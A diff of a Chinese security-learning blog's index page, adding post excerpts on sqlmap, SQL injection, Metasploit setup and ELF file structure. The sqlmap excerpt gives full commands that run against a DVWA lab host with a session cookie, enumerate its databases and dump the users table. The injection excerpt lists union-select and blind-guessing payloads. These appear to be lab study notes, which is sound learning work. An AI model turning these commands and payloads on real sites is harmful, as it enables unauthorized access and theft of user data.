@@ -157,6 +157,362 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-sqlmap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/13/sqlmap/">kail 2.0sqlmap使用</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/06/13/sqlmap/" class="archive-article-date">
+  	<time datetime="2018-06-13T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-13</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>sqlmap用法</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find / -name sqlmap.py 2&gt;&gt;null</span><br><span class="line">cd /usr/share/sqlmap</span><br><span class="line"></span><br><span class="line">//使用sqlmap检测是路径是否有注入点</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos;</span><br><span class="line">//获取数据库名称 --dbs参数</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; --dbs</span><br><span class="line">//获取表名 -D数据库名称 --tables枚举表名</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; -D dvwa --tables </span><br><span class="line">//枚举数据库下的表的列</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; -D dvwa -T users --columns</span><br><span class="line">//下载数据 --dump</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; --tables -T users --columns --dump</span><br><span class="line">//获取交互的shell</span><br><span class="line">python sqlmap.py -h | grep shell</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>sql注入</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql </span><br><span class="line">1. 使用#或--注释掉后面的</span><br><span class="line">2. 使用union select 1,2 猜测返回的列数</span><br><span class="line">3. 使用union select 1,2 form tables 获取其他表的数据</span><br><span class="line">4. 使用union password,concat(first_name,&apos; &apos;,last_name,&apos; &apos;,user) form users //拼接字段输出更多信息</span><br><span class="line">5. 如果union可行,则可以使用version(),database(),user()等函数获取信息</span><br><span class="line"></span><br><span class="line">//拆半猜解法 最好使用sqlmap等工具</span><br><span class="line">and length(database()) &gt; 11 猜测数据库名长度</span><br><span class="line">and ascii(substring(database(),1,1))&gt;97 猜测第一个字符</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kail</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">metasploit</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/06/13/sqlmap/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-metasploit问题集锦" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/13/metasploit问题集锦/">metasploit使用集锦</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/06/13/metasploit问题集锦/" class="archive-article-date">
+  	<time datetime="2018-06-13T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-13</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+</blockquote>
+<blockquote>
+<p>metasploit PostgreSQL数据库</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//Database not connected or cache not built</span><br><span class="line"></span><br><span class="line">service postgresql start</span><br><span class="line">db_rebuild_cache</span><br><span class="line"></span><br><span class="line">db_status //查看数据库连接是否正常</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>模块</p>
+</blockquote>
+<p>辅助模块:auxiliary<br>攻击模块:exploits<br>后渗透攻击模块:post<br>攻击载荷模块:payloads 在渗透攻击成功后，促使目标系统运行一段植入的代码 独立=传输器+传输体<br>空指令模块:nops 为了避免内存地址随机化和返回地址计算偏差等原因导致的shellcode执行失败，添加空指令区<br>编码器模块:encoders</p>
+<blockquote>
+<p>如何使用metasplot工具</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.添加ruby环境变量</span><br><span class="line">find / -name ruby #查找ruby目录</span><br><span class="line">vim /etc/profile #添加ruby目录到环境变量</span><br><span class="line">添加export PATH=/usr/share/metasploit-framework/ruby:$PATH</span><br><span class="line">2.进入工具目录</span><br><span class="line">find / -name pattern_create.rb #查找工具目录</span><br><span class="line">执行bundle install</span><br><span class="line">3.然后可以执行工具</span><br><span class="line">例如./pattern_create.rb -l 5000</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/06/13/metasploit问题集锦/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-快思考与慢思考" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/19/快思考与慢思考/">快思考与慢思考</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/05/19/快思考与慢思考/" class="archive-article-date">
+  	<time datetime="2018-05-19T03:08:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-19</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&lt;思考快与慢&gt;讲述大脑的2种思维模式，通过引入一些词汇让大脑产生概念，从而对大脑的思维模式能更好的理解并使用。<br>以下为书籍&lt;思考快与慢&gt;的观点及延伸。<br></p>
+        
+          <a class="article-more-a" href="/2018/05/19/快思考与慢思考/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/05/19/快思考与慢思考/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-ELF文件解析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/27/ELF文件解析/">ELF文件解析</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/04/27/ELF文件解析/" class="archive-article-date">
+  	<time datetime="2018-04-27T06:37:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-27</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ELF概述"><a href="#ELF概述" class="headerlink" title="ELF概述"></a>ELF概述</h1><p>ELF格式文件存储linux程序,主要有3种:<br>可重定向文件:保存代码和适当数据,与其他目标文件创建可执行文件或者是共享目标文件,一般是.a和.0文件<br>可执行文件:可执行程序<br>共享目标文件:共享库,文件保存代码和合适数据,用来被链接编辑器和动态链接器链接,为.so文件</p>
+<p>一般包含3个索引表:ELF header,Program Header table,Section header table<br>ELF header:文件开始,描述文件组织情况<br>Program header table:告诉系统如何创建进程,构造进程映像的目标文件必须有程序头部表,可重定向文件不需要<br>Section header table:</p>
+<ul>
+<li><p>linux下专门读取elf文件信息的工具:readelf/16进制工具 hexdump</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">man readelf</span><br><span class="line">readelf -h file 查看ELF文件头</span><br><span class="line">readelf -S file 查看section header</span><br><span class="line">readelf -l file 查看Program header</span><br><span class="line">readelf -s file ELF符号表</span><br><span class="line">man hexdump</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>elf结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef int32_t  Elf32_Sword;</span><br><span class="line">typedef uint32_t Elf64_Word;</span><br><span class="line">typedef int32_t  Elf64_Sword;</span><br><span class="line"></span><br><span class="line">ELF_HEADER:</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */</span><br><span class="line">  Elf32_Half    e_type;                 /* Object file type */</span><br><span class="line">  Elf32_Half    e_machine;              /* Architecture */</span><br><span class="line">  Elf32_Word    e_version;              /* Object file version */</span><br><span class="line">  Elf32_Addr    e_entry;                /* 入口点 */</span><br><span class="line">  Elf32_Off     e_phoff;                /* Section  Header偏移 */</span><br><span class="line">  Elf32_Off     e_shoff;                /* program Header偏移*/</span><br><span class="line">  Elf32_Word    e_flags;                /* Processor-specific flags */</span><br><span class="line">  Elf32_Half    e_ehsize;               /* ELF header size in bytes */</span><br><span class="line">  Elf32_Half    e_phentsize;            /* Program header table entry size */</span><br><span class="line">  Elf32_Half    e_phnum;                /* Program header table entry count */</span><br><span class="line">  Elf32_Half    e_shentsize;            /* Section header table entry size */</span><br><span class="line">  Elf32_Half    e_shnum;                /* Section header table entry count */</span><br><span class="line">  Elf32_Half    e_shstrndx;             /* Section header string table index */</span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line">Section  Header:</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    sh_name;        /* 段名 */</span><br><span class="line">  Elf32_Word    sh_type;        /* 段类型 */</span><br><span class="line">  Elf32_Word    sh_flags;       /* 段标志 */</span><br><span class="line">  Elf32_Addr    sh_addr;        /* 段虚拟地址 */</span><br><span class="line">  Elf32_Off sh_offset;          /* 段文件偏移 */</span><br><span class="line">  Elf32_Word    sh_size;        /* 段大小 */</span><br><span class="line">  Elf32_Word    sh_link;        /* 段链接信息1 */</span><br><span class="line">  Elf32_Word    sh_info;        /* 段链接信息2 */</span><br><span class="line">  Elf32_Word    sh_addralign;       /* 段对齐方式 */</span><br><span class="line">  Elf32_Word    sh_entsize;     /* 表项大小 */</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line">program Header</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    p_type;         /* 段类型 */</span><br><span class="line">  Elf32_Off 	p_offset;       /* 段文件偏移 */</span><br><span class="line">  Elf32_Addr    p_vaddr;        /* 段虚拟地址 */</span><br><span class="line">  Elf32_Addr    p_paddr;        /* 段物理地址 */</span><br><span class="line">  Elf32_Word    p_filesz;       /* 段在文件中的大小 */</span><br><span class="line">  Elf32_Word    p_memsz;        /* 段在内存中的大小 */</span><br><span class="line">  Elf32_Word    p_flags;        /* 段属性 */</span><br><span class="line">  Elf32_Word    p_align;        /* 段对齐值 */</span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/27/ELF文件解析/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
     <article id="post-linux 自启动" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -416,94 +772,6 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-ELF文件解析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/27/ELF文件解析/">ELF文件解析</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/04/27/ELF文件解析/" class="archive-article-date">
-  	<time datetime="2018-04-27T06:37:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-27</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ELF概述"><a href="#ELF概述" class="headerlink" title="ELF概述"></a>ELF概述</h1><p>ELF格式文件存储linux程序,主要有3种:<br>可重定向文件:保存代码和适当数据,与其他目标文件创建可执行文件或者是共享目标文件,一般是.a和.0文件<br>可执行文件:可执行程序<br>共享目标文件:共享库,文件保存代码和合适数据,用来被链接编辑器和动态链接器链接,为.so文件</p>
-<p>一般包含3个索引表:ELF header,Program Header table,Section header table<br>ELF header:文件开始,描述文件组织情况<br>Program header table:告诉系统如何创建进程,构造进程映像的目标文件必须有程序头部表,可重定向文件不需要<br>Section header table:</p>
-<ul>
-<li><p>linux下专门读取elf文件信息的工具:readelf/16进制工具 hexdump</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">man readelf</span><br><span class="line">readelf -h file 查看ELF文件头</span><br><span class="line">readelf -S file 查看section header</span><br><span class="line">readelf -l file 查看Program header</span><br><span class="line">readelf -s file ELF符号表</span><br><span class="line">man hexdump</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>elf结构</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef int32_t  Elf32_Sword;</span><br><span class="line">typedef uint32_t Elf64_Word;</span><br><span class="line">typedef int32_t  Elf64_Sword;</span><br><span class="line"></span><br><span class="line">ELF_HEADER:</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */</span><br><span class="line">  Elf32_Half    e_type;                 /* Object file type */</span><br><span class="line">  Elf32_Half    e_machine;              /* Architecture */</span><br><span class="line">  Elf32_Word    e_version;              /* Object file version */</span><br><span class="line">  Elf32_Addr    e_entry;                /* 入口点 */</span><br><span class="line">  Elf32_Off     e_phoff;                /* Section  Header偏移 */</span><br><span class="line">  Elf32_Off     e_shoff;                /* program Header偏移*/</span><br><span class="line">  Elf32_Word    e_flags;                /* Processor-specific flags */</span><br><span class="line">  Elf32_Half    e_ehsize;               /* ELF header size in bytes */</span><br><span class="line">  Elf32_Half    e_phentsize;            /* Program header table entry size */</span><br><span class="line">  Elf32_Half    e_phnum;                /* Program header table entry count */</span><br><span class="line">  Elf32_Half    e_shentsize;            /* Section header table entry size */</span><br><span class="line">  Elf32_Half    e_shnum;                /* Section header table entry count */</span><br><span class="line">  Elf32_Half    e_shstrndx;             /* Section header string table index */</span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line">Section  Header:</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    sh_name;        /* 段名 */</span><br><span class="line">  Elf32_Word    sh_type;        /* 段类型 */</span><br><span class="line">  Elf32_Word    sh_flags;       /* 段标志 */</span><br><span class="line">  Elf32_Addr    sh_addr;        /* 段虚拟地址 */</span><br><span class="line">  Elf32_Off sh_offset;          /* 段文件偏移 */</span><br><span class="line">  Elf32_Word    sh_size;        /* 段大小 */</span><br><span class="line">  Elf32_Word    sh_link;        /* 段链接信息1 */</span><br><span class="line">  Elf32_Word    sh_info;        /* 段链接信息2 */</span><br><span class="line">  Elf32_Word    sh_addralign;       /* 段对齐方式 */</span><br><span class="line">  Elf32_Word    sh_entsize;     /* 表项大小 */</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line">program Header</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    p_type;         /* 段类型 */</span><br><span class="line">  Elf32_Off 	p_offset;       /* 段文件偏移 */</span><br><span class="line">  Elf32_Addr    p_vaddr;        /* 段虚拟地址 */</span><br><span class="line">  Elf32_Addr    p_paddr;        /* 段物理地址 */</span><br><span class="line">  Elf32_Word    p_filesz;       /* 段在文件中的大小 */</span><br><span class="line">  Elf32_Word    p_memsz;        /* 段在内存中的大小 */</span><br><span class="line">  Elf32_Word    p_flags;        /* 段属性 */</span><br><span class="line">  Elf32_Word    p_align;        /* 段对齐值 */</span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure></li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/27/ELF文件解析/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
     <article id="post-python高级特性" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -561,92 +829,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/04/09/python高级特性/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-python一些小脚本" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/09/python一些小脚本/">python一些小脚本</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/04/09/python一些小脚本/" class="archive-article-date">
-  	<time datetime="2018-04-09T06:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-09</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>16进制数字转C++字符串</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">str2 = &apos;&apos;&apos;</span><br><span class="line">08 26 00 02 3A 0E 20 10 27 23 24 00 31 04 00 04 34 28 04 00 26 2B 00 20 13 16 24 00 3F 00 08 00</span><br><span class="line">11 38 20 01 00 1F 00 20 0E 34 20 00 15 30 09 20 0C 0B 00 05 0E 03 08 20 25 05 00 01 13 3C 0D 00</span><br><span class="line">04 3F 10 20 21 1A 00 08 3A 0E 10 00 16 08 00 03 07 11 18 20 30 2B 00 01 32 24 00 20 0B 33 00 03</span><br><span class="line">0D 1C 08 20 2D 05 20 02 10 29 08 02 13 24 00 02 25 1A 08 00 1C 32 30 00 29 1D 00 00 0A 09 02 04</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import sys</span><br><span class="line">list1 = str2.split(); //不填参数默认去除空格,换行,制表符</span><br><span class="line">count = 0;</span><br><span class="line">sys.stdout.write(&apos;&quot;&apos;);</span><br><span class="line">for i in list1:</span><br><span class="line">    sys.stdout.write(&quot;\\x&quot; + i);</span><br><span class="line">    count = count + 1;</span><br><span class="line">    if(count &gt;=32):</span><br><span class="line">        sys.stdout.write(&apos;&quot;\n&quot;&apos;);</span><br><span class="line">        count = 0;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>dex加密解密</p>
-</blockquote>
